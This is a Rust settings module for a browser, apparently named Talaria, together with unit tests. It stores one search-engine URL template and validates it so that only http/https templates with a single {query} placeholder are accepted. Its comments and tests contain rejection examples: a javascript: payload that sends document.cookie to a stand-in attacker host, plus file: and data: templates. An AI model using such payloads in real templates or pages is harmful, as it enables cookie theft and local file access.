//! Settings: the single small object of user preference this browser keeps,
//! stored as one JSON object in `config.json` beside the vault.
//!
//! **This is the project's first config file.** `CLAUDE.md` states plainly
//! that Talaria has "no `.env` files, no config file format" — every knob is
//! an environment variable or an argv entry. That statement stops being true
//! here, and the boundary is worth naming rather than crossing quietly: a
//! search engine is a preference a person sets once and expects to still be
//! there next month, which is not something an environment variable can be.
//! The file is deliberately kept to the smallest possible shape — one object,
//! one key — so that a later reader can see exactly how much was conceded.
//!
//! Three things separate this store from the three that came before it:
//!
//! - **It holds one object, not a list.** [`crate::history`],
//!   [`crate::bookmarks`] and [`crate::vault`] each own a collection; this
//!   owns a single [`SearchEngine`]. There is deliberately no engine *list*
//!   and no id on an engine: exactly one is configured at a time, so "the
//!   current engine" needs no identity of its own to be found by.
//! - **A missing file is not an empty store, it is the default engine.** The
//!   default reproduces today's hardcoded DuckDuckGo behaviour byte for byte,
//!   so a fresh install behaves exactly as every install did before this
//!   module existed.
//! - **Loaded data is validated, not merely parsed.** A `url_template` that
//!   cannot possibly work — one that does not name where the query goes —
//!   is rejected at load time in favour of the default, because a template
//!   that parses but cannot be substituted into would silently send every
//!   search to the wrong place.
//!
//! Writes follow [`crate::bookmarks`]: staged into a `.tmp` sibling and moved
//! into place with [`fs::rename`], never [`fs::write`] over the live file.
//! There is deliberately no control-socket command and no MCP tool that
//! reaches this module — which engine a person searches with is not an
//! agent's to read or to change.

use std::fs;
use std::path::PathBuf;

use crate::permissions;

/// The search engine the address bar falls back to when what the human typed
/// is not a URL.
///
/// No id, no uuid, no "is this the active one" flag: exactly one engine is
/// configured at a time, so the pair of strings *is* the whole identity. A
/// future phase wanting a picker among several presets can add a list around
/// this shape without changing it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SearchEngine {
    /// What to call this engine in the Settings panel. Display only —
    /// nothing keys on it.
    pub name: String,
    /// The search URL, with the literal `{query}` standing where the
    /// URL-encoded search terms belong. Must be an `http`/`https` URL and
    /// must contain that placeholder exactly once — see
    /// [`is_valid_template`].
    pub url_template: String,
}

impl Default for SearchEngine {
    fn default() -> Self {
        // Byte-for-byte what `resolve_location` hardcoded before this module
        // existed: a fresh install (no config.json yet) behaves identically
        // to every install that came before it.
        Self {
            name: "DuckDuckGo".to_owned(),
            url_template: "https://duckduckgo.com/?q={query}".to_owned(),
        }
    }
}

impl SearchEngine {
    /// This engine as the JSON object the stored file holds.
    ///
    /// Built through `serde_json::json!` rather than a `Serialize` derive
    /// because `serde` itself is not a dependency of this crate — only
    /// `serde_json` is — and this phase may not add one. `to_json` and
    /// `from_json` sit next to each other so a field added to one is visibly
    /// missing from the other.
    fn to_json(&self) -> serde_json::Value {
        serde_json::json!({
            "name": self.name,
            "url_template": self.url_template,
        })
    }

    /// One stored object back into an engine, or `None` for an object this
    /// module cannot make sense of.
    ///
    /// Both fields are load-bearing here, which is the difference from
    /// [`crate::bookmarks`]'s per-field degrade: an engine with no template
    /// cannot search, and an engine with no name cannot be shown, so a
    /// half-present object is discarded rather than patched. The caller turns
    /// that `None` into [`SearchEngine::default`].
    fn from_json(value: &serde_json::Value) -> Option<Self> {
        Some(Self {
            name: value.get("name")?.as_str()?.to_owned(),
            url_template: value.get("url_template")?.as_str()?.to_owned(),
        })
    }
}

/// Whether `template` names exactly one place to put the search terms, and
/// resolves to a web URL when it does.
///
/// A free function rather than a method so the Settings panel's Save gate and
/// this module's own load-time validation can share one definition of
/// "valid" without either reaching into the other's private state. Both rules
/// below therefore reach a hand-edited `config.json` exactly as they reach
/// the panel: a template that never went through the Save button is not
/// trusted for having skipped it.
///
/// Exactly one, not at least one: `resolve_location` substitutes the first
/// occurrence only, so a two-placeholder template would send a literal
/// `{query}` out on the wire — a broken search that looks like a working one.
///
/// The second half is a scheme check, and it is the security half. A
/// template is not merely a string with a hole in it — it is what the address
/// bar navigates to for every non-URL thing the human types, and it persists
/// across restarts. `javascript:fetch('https://evil/'+document.cookie)//
/// {query}` and `file:///etc/{query}` both contain `{query}` exactly once,
/// both parse, and neither is a search engine.
///
/// `resolve_location` already refuses `data:` typed into the address bar,
/// because "paste this into your address bar" makes the human a courier for
/// someone else's payload. "Paste this into your search settings" is the same
/// attack with one more step and a far longer persistence, and refusing one
/// while accepting the other is an asymmetry running the wrong way.
/// `resolve_location`'s own `Url::parse` fallback does not catch these —
/// `javascript:` and `file:` parse perfectly well.
pub fn is_valid_template(template: &str) -> bool {
    if template.matches("{query}").count() != 1 {
        return false;
    }
    // Validated against what the template resolves to, not against its shape.
    // The probe stands in for the search terms: any non-empty substitution
    // would do, since only the scheme is being read off the result.
    matches!(
        url::Url::parse(&template.replacen("{query}", "probe", 1)),
        Ok(parsed) if matches!(parsed.scheme(), "http" | "https")
    )
}

/// Where every store in this crate keeps its file.
fn config_dir() -> PathBuf {
    let path = dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("talaria");
    // Owner-only, and created here rather than in the write paths below.
    // This is the one directory known to be this browser's own, where a write
    // path is handed whatever `Path::parent` yields — the shared system temp
    // directory under a unit test. See [`crate::permissions`].
    permissions::create_dir_owner_only(&path);
    path
}

/// Everything this browser remembers about how its human likes it.
pub struct Settings {
    path: PathBuf,
    /// The engine the address bar's search fallback uses.
    pub search_engine: SearchEngine,
}

impl Default for Settings {
    fn default() -> Self {
        Self::defaults_at(config_dir().join("config.json"))
    }
}

impl Settings {
    /// The defaults, remembering where they would be saved.
    fn defaults_at(path: PathBuf) -> Self {
        Self { path, search_engine: SearchEngine::default() }
    }

    /// Read the settings once, at startup.
    ///
    /// Degrade, never abort: a file that cannot be read, does not parse, or
    /// holds an engine this module would refuse to save produces the
    /// defaults rather than an error the caller has to handle or a panic that
    /// takes startup with it.
    pub fn load() -> Self {
        Self::load_from(config_dir().join("config.json"))
    }

    fn load_from(path: PathBuf) -> Self {
        let stored: Option<serde_json::Value> = fs::read(&path)
            .ok()
            .and_then(|data| serde_json::from_slice(&data).ok());
        let Some(stored) = stored else {
            // Absent and unreadable are the same answer — the defaults — but
            // only the second is worth saying out loud, and only when there
            // is something there to have failed on.
            if path.exists() {
                log::warn!("settings: {} is unreadable; using the defaults", path.display());
            }
            return Self::defaults_at(path);
        };
        let Some(engine) = stored.get("search_engine").and_then(SearchEngine::from_json) else {
            if stored.get("search_engine").is_some() {
                log::warn!(
                    "settings: the search engine in {} is not readable; using the default",
                    path.display()
                );
            }
            return Self::defaults_at(path);
        };
        // Validated, not merely parsed. A template that names no place to put
        // the query would send every search to the same fixed URL, so it is
        // discarded whole — name included, because a panel reading "Kagi"
        // while searching DuckDuckGo is worse than one reading the truth.
        //
        // This is also the gate a hand-edited file meets. A `javascript:` or
        // `file:` template that never went through the panel's Save button
        // degrades to the default here rather than being honoured for having
        // arrived by the back door.
        if !is_valid_template(&engine.url_template) {
            log::warn!(
                "settings: {:?} is not an http(s) URL containing {{query}} exactly once; \
                 using the default engine",
                engine.url_template
            );
            return Self::defaults_at(path);
        }
        Self { path, search_engine: engine }
    }

    /// Replace the configured engine and persist it.
    ///
    /// The caller validates: the Settings panel's Save button is disabled
    /// until [`is_valid_template`] passes, so this method does not re-check
    /// and does not reject. What it does guarantee is that the in-memory
    /// field is updated whether or not the disk write succeeds — a
    /// preference that could not be written still applies to the session the
    /// human is in, and losing it at the next restart is a better answer than
    /// refusing the change.
    ///
    /// Staged into a `.tmp` sibling and moved into place with [`fs::rename`],
    /// which is atomic on the same filesystem, so a process killed mid-save
    /// leaves either the old settings or the new ones — never a half-written
    /// file the next startup would read as corrupt and silently discard.
    pub fn save(&mut self, engine: SearchEngine) {
        self.search_engine = engine;
        let document = serde_json::json!({ "search_engine": self.search_engine.to_json() });
        let Ok(data) = serde_json::to_vec(&document) else {
            log::warn!("settings could not be serialised; this change will not survive a restart");
            return;
        };
        // Staged beside the target, never in the temp directory: `fs::rename`
        // is only atomic within one filesystem, and a config directory on a
        // different mount than /tmp is an ordinary setup.
        let Some(name) = self.path.file_name().map(|name| name.to_string_lossy().into_owned())
        else {
            log::warn!("settings path has no file name; not saving");
            return;
        };
        let staged = self.path.with_file_name(format!("{name}.tmp"));
        if let Some(parent) = self.path.parent() {
            let _ = fs::create_dir_all(parent);
        }
        // Restricted on the staging file, not on the target: a rename swaps
        // the destination's inode for the staged one, so the mode that lands
        // is the staged file's.
        if let Err(error) = permissions::write_owner_only(&staged, &data) {
            log::warn!("could not stage settings: {error}");
            return;
        }
        if let Err(error) = fs::rename(&staged, &self.path) {
            log::warn!("could not replace settings with the new ones: {error}");
            let _ = fs::remove_file(&staged);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    use std::sync::atomic::{AtomicU64, Ordering};

    static COUNTER: AtomicU64 = AtomicU64::new(0);

    /// A `config.json` path in the temp directory that removes itself, and
    /// the `.tmp` sibling [`Settings::save`] writes, when a test ends.
    ///
    /// `tempfile` is not a dependency of this crate and this plan may not add
    /// one, so the unique name is built here: the process id keeps two
    /// concurrent `cargo test` runs apart, and the counter keeps this
    /// process's own parallel test threads apart. Lifted verbatim from
    /// [`crate::bookmarks`]'s own tests.
    struct TempPath(PathBuf);

    impl TempPath {
        fn new() -> Self {
            let unique = COUNTER.fetch_add(1, Ordering::Relaxed);
            let name = format!("talaria-config-{}-{unique}.json", std::process::id());
            Self(std::env::temp_dir().join(name))
        }

        fn path(&self) -> PathBuf {
            self.0.clone()
        }

        /// The `.tmp` sibling a save stages through, which must never survive
        /// a completed save.
        fn temp_sibling(&self) -> PathBuf {
            let name = self.0.file_name().map(|name| name.to_string_lossy().into_owned());
            match name {
                Some(name) => self.0.with_file_name(format!("{name}.tmp")),
                None => self.0.clone(),
            }
        }

        fn write(&self, contents: &str) {
            fs::write(&self.0, contents).expect("write the test fixture");
        }

        fn read(&self) -> String {
            fs::read_to_string(&self.0).unwrap_or_default()
        }

        fn exists(&self) -> bool {
            self.0.exists()
        }
    }

    impl Drop for TempPath {
        fn drop(&mut self) {
            let _ = fs::remove_file(&self.0);
            let _ = fs::remove_file(self.temp_sibling());
        }
    }

    /// The zero-regression guard: a fresh install must search exactly where
    /// every install before this module did.
    #[test]
    fn the_default_engine_is_todays_hardcoded_duckduckgo() {
        let engine = SearchEngine::default();
        assert_eq!(engine.name, "DuckDuckGo");
        assert_eq!(engine.url_template, "https://duckduckgo.com/?q={query}");
    }

    #[test]
    fn a_template_with_one_placeholder_is_valid_wherever_it_sits() {
        assert!(is_valid_template("https://duckduckgo.com/?q={query}"));
        assert!(is_valid_template("https://example.com/search?q={query}&format=json"));
        // Path position, not just query position.
        assert!(is_valid_template("https://en.wikipedia.org/wiki/{query}"));
        // Plain http as well as https: a search engine on a local network is
        // a real thing, and the scheme check exists to exclude payloads, not
        // to enforce transport security.
        assert!(is_valid_template("http://localhost:8888/search?q={query}"));
    }

    #[test]
    fn a_template_with_no_placeholder_is_invalid() {
        assert!(!is_valid_template("https://example.com/search"));
        assert!(!is_valid_template(""));
        // Near-misses are still misses: nothing substitutes these.
        assert!(!is_valid_template("https://example.com/?q={QUERY}"));
        assert!(!is_valid_template("https://example.com/?q={q}"));
    }

    /// The Settings panel writes what the address bar then navigates to, for
    /// every non-URL thing the human types, and it persists across restarts.
    /// `resolve_location` refuses `data:` typed into the address bar for
    /// exactly this reason; accepting `javascript:` through the settings
    /// field would be the same attack with one more step and a much longer
    /// persistence.
    ///
    /// Every string below contains `{query}` exactly once and parses cleanly
    /// as a URL, so the placeholder rule alone lets all of them through.
    #[test]
    fn a_template_that_is_not_a_web_url_is_invalid() {
        assert!(!is_valid_template("javascript:alert({query})"));
        assert!(!is_valid_template(
            "javascript:fetch('https://evil.example/'+document.cookie)//{query}"
        ));
        assert!(!is_valid_template("file:///etc/{query}"));
        assert!(!is_valid_template("file:///{query}"));
        assert!(!is_valid_template("data:text/html,<script>{query}</script>"));
        // A bare placeholder parses as nothing at all: no scheme, no host.
        assert!(!is_valid_template("{query}"));
        assert!(!is_valid_template("example.com/?q={query}"));
    }

    /// Two placeholders are rejected rather than "substitute the first":
    /// `replacen(.., 1)` would leave a literal `{query}` in the outgoing URL,
    /// which is a broken search that looks like a working one.
    #[test]
    fn a_template_with_two_placeholders_is_invalid() {
        assert!(!is_valid_template("https://example.com/{query}?q={query}"));
        assert!(!is_valid_template("{query}{query}{query}"));
    }

    #[test]
    fn a_missing_file_loads_as_the_default_engine() {
        let temp = TempPath::new();
        let settings = Settings::load_from(temp.path());
        assert_eq!(settings.search_engine, SearchEngine::default());
    }

    #[test]
    fn unparseable_json_loads_as_the_default_engine_without_panicking() {
        let temp = TempPath::new();
        temp.write("{not json at all");
        let settings = Settings::load_from(temp.path());
        assert_eq!(settings.search_engine, SearchEngine::default());
    }

    /// The right JSON of the wrong shape — an array, or an object with no
    /// `search_engine` key — is the other half of the corruption case.
    #[test]
    fn a_file_of_the_wrong_shape_loads_as_the_default_engine() {
        let temp = TempPath::new();
        temp.write(r#"[{"name":"Nope"}]"#);
        assert_eq!(Settings::load_from(temp.path()).search_engine, SearchEngine::default());

        temp.write(r#"{"something_else":true}"#);
        assert_eq!(Settings::load_from(temp.path()).search_engine, SearchEngine::default());
    }

    /// Load-time validation, not merely parsing: a hand-edited template with
    /// no placeholder is discarded whole, not half-applied. The engine's
    /// *name* must not survive either — a panel showing "Kagi" while
    /// searching DuckDuckGo would be worse than showing the truth.
    #[test]
    fn an_invalid_template_on_disk_loads_as_the_whole_default_engine() {
        let temp = TempPath::new();
        temp.write(r#"{"search_engine":{"name":"Broken","url_template":"https://example.com/"}}"#);
        let settings = Settings::load_from(temp.path());
        assert_eq!(settings.search_engine, SearchEngine::default());
        assert_eq!(settings.search_engine.name, "DuckDuckGo", "a half-applied engine survived");
    }

    /// The Save gate and the load path share [`is_valid_template`], so a
    /// template that could never have been saved through the panel must not
    /// be honoured for having arrived by hand instead. Each of these contains
    /// `{query}` exactly once, so only the scheme check stops them.
    #[test]
    fn a_hand_edited_non_web_template_loads_as_the_whole_default_engine() {
        for template in [
            r"javascript:fetch('https://evil.example/'+document.cookie)//{query}",
            r"file:///etc/{query}",
            r"data:text/html,{query}",
        ] {
            let temp = TempPath::new();
            temp.write(&format!(
                r#"{{"search_engine":{{"name":"Totally Normal","url_template":"{template}"}}}}"#
            ));
            let settings = Settings::load_from(temp.path());
            assert_eq!(
                settings.search_engine,
                SearchEngine::default(),
                "{template} was honoured from a hand-edited config"
            );
        }
    }

    /// The other side of the same gate: a hand-edited file naming a perfectly
    /// ordinary `https` engine is still honoured, so the check above is
    /// rejecting the scheme and not the hand-editing.
    #[test]
    fn a_hand_edited_https_template_is_still_honoured() {
        let temp = TempPath::new();
        temp.write(
            r#"{"search_engine":{"name":"Kagi","url_template":"https://kagi.com/search?q={query}"}}"#,
        );
        let settings = Settings::load_from(temp.path());
        assert_eq!(settings.search_engine.name, "Kagi");
        assert_eq!(settings.search_engine.url_template, "https://kagi.com/search?q={query}");
    }

    /// The save renames a staged sibling into place, and a rename carries the
    /// *staged* file's mode, so this pins the mode being set before the
    /// rename rather than after it.
    #[cfg(unix)]
    #[test]
    fn saved_settings_land_owner_only_through_the_rename() {
        let temp = TempPath::new();
        let mut settings = Settings::load_from(temp.path());
        settings.save(SearchEngine {
            name: "Example".to_owned(),
            url_template: "https://example.com/search?q={query}".to_owned(),
        });

        assert!(temp.path().exists(), "the save did not land");
        assert_eq!(permissions::mode_of(&temp.path()), 0o600);
    }

    /// A staging file an interrupted save left behind is a file that already
    /// exists, and `OpenOptions::mode` is ignored for those — so without the
    /// second `set_permissions` a loose `.tmp` would be renamed into place
    /// carrying its loose mode with it.
    #[cfg(unix)]
    #[test]
    fn a_stale_world_readable_staging_file_does_not_loosen_the_save() {
        use std::os::unix::fs::PermissionsExt;

        let temp = TempPath::new();
        fs::write(temp.temp_sibling(), b"stale").expect("write the test fixture");
        fs::set_permissions(temp.temp_sibling(), fs::Permissions::from_mode(0o644))
            .expect("loosen the test fixture");

        let mut settings = Settings::load_from(temp.path());
        settings.save(SearchEngine {
            name: "Example".to_owned(),
            url_template: "https://example.com/search?q={query}".to_owned(),
        });

        assert_eq!(permissions::mode_of(&temp.path()), 0o600);
    }

    #[test]
    fn a_saved_engine_survives_a_reload() {
        let temp = TempPath::new();
        let mut settings = Settings::load_from(temp.path());
        settings.save(SearchEngine {
            name: "Example".to_owned(),
            url_template: "https://example.com/search?q={query}&format=json".to_owned(),
        });

        let reloaded = Settings::load_from(temp.path());
        assert_eq!(reloaded.search_engine.name, "Example");
        assert_eq!(
            reloaded.search_engine.url_template,
            "https://example.com/search?q={query}&format=json"
        );
    }

    /// A placeholder that is not at the end of the template must survive the
    /// round trip untouched — nothing in this module may "helpfully" move it.
    #[test]
    fn a_placeholder_in_the_middle_round_trips_intact() {
        let temp = TempPath::new();
        let template = "https://example.com/{query}/results?lang=en".to_owned();
        let mut settings = Settings::load_from(temp.path());
        settings.save(SearchEngine { name: "Middle".to_owned(), url_template: template.clone() });

        assert_eq!(Settings::load_from(temp.path()).search_engine.url_template, template);
    }

    #[test]
    fn a_repeated_identical_save_changes_nothing() {
        let temp = TempPath::new();
        let engine = SearchEngine {
            name: "Example".to_owned(),
            url_template: "https://example.com/?q={query}".to_owned(),
        };
        let mut settings = Settings::load_from(temp.path());
        settings.save(engine.clone());
        let first = temp.read();
        settings.save(engine.clone());

        assert_eq!(temp.read(), first, "a repeated identical save wrote something different");
        assert_eq!(Settings::load_from(temp.path()).search_engine, engine);
    }

    /// The target file only ever changes through a rename, so a completed
    /// save leaves no staging file behind and the target always parses.
    #[test]
    fn a_save_stages_through_a_temp_file_and_leaves_none_behind() {
        let temp = TempPath::new();
        let mut settings = Settings::load_from(temp.path());
        settings.save(SearchEngine {
            name: "Example".to_owned(),
            url_template: "https://example.com/?q={query}".to_owned(),
        });

        assert!(temp.exists(), "the save did not land");
        assert!(!temp.temp_sibling().exists(), "the save left its staging file behind");
        let parsed: serde_json::Value =
            serde_json::from_str(&temp.read()).expect("the saved file is valid JSON");
        assert!(parsed.get("search_engine").is_some(), "the saved file has no search_engine");
    }

    /// A stale `.tmp` from an interrupted earlier save must not be read as
    /// data, and must not stop the next save from landing.
    #[test]
    fn a_stale_staging_file_does_not_block_the_next_save() {
        let temp = TempPath::new();
        fs::write(temp.temp_sibling(), b"garbage from a killed process")
            .expect("write the stale staging file");

        let mut settings = Settings::load_from(temp.path());
        settings.save(SearchEngine {
            name: "Example".to_owned(),
            url_template: "https://example.com/?q={query}".to_owned(),
        });

        assert_eq!(Settings::load_from(temp.path()).search_engine.name, "Example");
    }

    /// Even when the write cannot land, the session the human is in must
    /// behave as though it did — degrade, never abort.
    #[test]
    fn an_unwritable_path_still_updates_the_running_session() {
        // A path whose parent is a file, not a directory: create_dir_all and
        // the staged write both fail, and nothing may panic.
        let temp = TempPath::new();
        temp.write("{}");
        let blocked = temp.path().join("nested").join("config.json");

        let mut settings = Settings::load_from(blocked);
        settings.save(SearchEngine {
            name: "Example".to_owned(),
            url_template: "https://example.com/?q={query}".to_owned(),
        });

        assert_eq!(settings.search_engine.name, "Example");
    }
}
